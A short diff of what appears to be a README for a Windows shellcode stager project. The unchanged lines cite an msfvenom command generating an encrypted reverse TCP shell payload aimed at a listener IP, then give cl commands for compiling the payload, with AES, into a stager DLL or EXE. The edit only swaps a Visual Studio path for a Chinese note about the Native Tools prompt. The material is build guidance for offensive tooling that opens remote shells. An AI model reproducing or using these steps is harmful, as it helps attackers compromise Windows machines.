@@ -21,7 +21,7 @@ ruby msfvenom -p windows/x64/encrypted_shell_reverse_tcp LHOST=192.168.1.24 LPOR
 Replace the payload in stager_dll_xx.cpp and build the DLL on a Windows machine with the following command:  
 ```cl /LD /MT /EHa stager_dll_xx.cpp aes.cpp /Fe:stager.dll```  
   
-```C:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.25.28610\bin\Hostx64\x64```
+```使用 VS2019 Native Tools Command Prompt 执行 cl 命令```
 You can also build a standalone executable with:  
 ```cl /MT /EHa stager_exe_xx.cpp aes.cpp /Fe:stager.exe```  
   
